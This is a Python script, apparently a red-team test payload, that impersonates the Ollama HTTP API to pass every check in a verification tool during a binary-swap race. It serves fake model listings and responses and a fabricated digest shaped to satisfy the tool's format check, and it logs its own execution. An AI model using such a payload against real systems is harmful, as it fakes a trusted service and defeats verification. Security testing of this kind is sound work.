#!/usr/bin/python3
"""A02BinarySwapRace payload: a non-pinned script that impersonates enough of
the Ollama HTTP surface to satisfy every graded check in kama-ollama-live.py.

Roles by argv:
  serve               bind OLLAMA_HOST and serve the faked surface
  create NAME -f F    record the created model in $HOME/attacker-state.json, exit 0

State is passed between the two roles through $HOME (child_env sets HOME for
both children; nothing else about the environment is attacker-controllable).
"""
import json
import os
import sys
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

DIGEST = 'ab12cd34' * 8  # 64 hex chars, satisfies the tool's [0-9a-f]{64} check
LOG = '/fast/scratch/hyaku/kama-r60/A02BinarySwapRace/hit.log'
STATE_NAME = 'attacker-state.json'
VERSION = '0.40.11'
GGUF_SIZE = 1185376

LOADED = False


def log(msg):
    try:
        with open(LOG, 'a') as f:
            f.write(time.strftime('%H:%M:%S') + ' ' + msg + '\n')
    except OSError:
        pass


def state():
    try:
        with open(os.path.join(os.environ['HOME'], STATE_NAME)) as f:
            return json.load(f)
    except (OSError, ValueError, KeyError):
        return None


def send(h, code, obj):
    raw = obj if isinstance(obj, bytes) else json.dumps(obj).encode()
    h.send_response(code)
    h.send_header('Content-Type', 'application/json' if not isinstance(obj, bytes) else 'text/plain')
    h.send_header('Content-Length', str(len(raw)))
    h.end_headers()
    h.wfile.write(raw)


class Handler(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'

    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        global LOADED
        st = state()
        q = st['qualified'] if st else None
        p = self.path.split('?', 1)[0]
        if p == '/':
            return send(self, 200, b'Ollama is running')
        if p == '/api/version':
            return send(self, 200, {'version': VERSION})
        if p == '/api/tags':
            models = [{'name': q, 'model': q, 'digest': DIGEST, 'size': GGUF_SIZE}] if q else []
            return send(self, 200, {'models': models})
        if p == '/api/ps':
            models = ([{'name': q, 'model': q, 'digest': DIGEST,
                        'expires_at': '2026-10-28T00:00:00Z',
                        'size': GGUF_SIZE, 'size_vram': 400000}] if q and LOADED else [])
            return send(self, 200, {'models': models})
        if p == '/v1/models':
            data = [{'id': q, 'object': 'model', 'owned_by': 'attacker'}] if q else None
            return send(self, 200, {'object': 'list', 'data': data})
        if p.startswith('/v1/models/'):
            return send(self, 200, {'id': p[len('/v1/models/'):], 'object': 'model'})
        return send(self, 404, {'error': 'not found'})

    def do_POST(self):
        global LOADED
        n = int(self.headers.get('Content-Length') or 0)
        if n:
            self.rfile.read(n)
        st = state()
        q = st['qualified'] if st else None
        if self.path == '/api/show':
            return send(self, 200, {'modelfile': 'FROM fixture.gguf',
                                    'details': {'family': 'llama', 'parameter_size': '260K'},
                                    'model_info': {'general.architecture': 'llama'}})
        if self.path == '/api/generate':
            LOADED = True
            return send(self, 200, {'model': q, 'created_at': '2026-10-27T00:00:00Z',
                                    'response': 'attacker', 'done': True,
                                    'done_reason': 'stop'})
        return send(self, 404, {'error': 'not found'})


def main():
    argv = sys.argv[1:]
    try:
        exe = os.readlink('/proc/self/exe')
    except OSError:
        exe = '?'
    log(f'PAYLOAD-EXEC pid={os.getpid()} argv={argv} exe={exe} '
        f'script={os.path.abspath(__file__)} ollama_host={os.environ.get("OLLAMA_HOST")}')
    if argv and argv[0] == 'serve':
        port = int(os.environ.get('OLLAMA_HOST', '127.0.0.1:0').rsplit(':', 1)[1])
        HTTPServer(('127.0.0.1', port), Handler).serve_forever()
    elif argv and argv[0] == 'create':
        name = argv[1] if len(argv) > 1 else 'unknown'
        with open(os.path.join(os.environ['HOME'], STATE_NAME), 'w') as f:
            json.dump({'qualified': f'{name}:latest', 'digest': DIGEST}, f)
        log(f'PAYLOAD-CREATE name={name}')
        sys.exit(0)
    sys.exit(0)


main()
